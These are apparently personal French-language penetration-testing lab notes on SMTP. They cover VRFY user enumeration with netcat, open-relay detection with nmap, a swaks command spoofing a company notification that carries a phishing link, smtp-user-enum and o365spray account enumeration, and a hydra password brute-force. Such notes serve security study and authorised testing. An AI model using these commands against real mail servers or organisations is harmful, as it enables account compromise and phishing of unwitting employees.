# Simple Mail Transfer Protocol
Service roulant sur le port TCP 25. Encrypté sur TCP 465
	
Peut recevoir des commandes:
* VRFY : vérifi si un utilisateur existe ex: “root”
* EXPN : liste Membres d'un liste d'envoi
 
## Envoi
 Client (MUA) 	➞ 	Submission Agent (MSA) 	➞ 	Open Relay (MTA) 	➞ 	Mail Delivery Agent (MDA) 	➞ 	Mailbox (POP3/IMAP)     
       
## Désavantages
Pas d'authentification. Envoyeur non-fiable

# ESTMP
Encrypté après **STARTTLS**. protégé par SSL. Peut s'authentifier avec AUTH.
       
# Outils
## Netcat / Telnet (windows)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
kali@kali:~$ nc -nv 192.168.50.8 25
(UNKNOWN) [192.168.50.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## Open Relay
Permet de cacher la source et passer pour le relai

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#identifier
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
#usurper
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## Force brute
Attention, ça peut être long à répondre. 15 secondes dans htb
Attention au nom de domaine, peut-être nécessaire

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#-D pour ajouter domaine. Dépend du serveur.
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#valider que c'est O365
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
hydra -S -l fiona -P pws.list -V 10.129.203.7 smtp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
